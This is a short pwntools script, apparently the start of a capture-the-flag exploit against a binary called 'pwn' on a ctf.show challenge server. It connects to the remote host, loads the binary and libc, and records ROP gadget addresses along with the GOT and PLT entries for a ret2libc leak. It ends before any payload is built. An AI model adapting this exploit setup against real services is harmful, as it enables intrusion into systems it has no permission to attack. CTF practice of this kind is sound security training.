from pwn import *
context.log_level = "debug"
#io = process("./pwn")
#io = remote('127.0.0.1',10000)
io = remote('pwn.challenge.ctf.show',28291)
elf = ELF("./pwn")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
pop_rdi = 0x4008e3  # 0x00000000004008e3 : pop rdi ; ret
ret = 0x400576      # 0x0000000000400576 : ret
fgetc_got = elf.got['fgetc']
main = elf.sym['main']
puts_plt = elf.plt['puts']
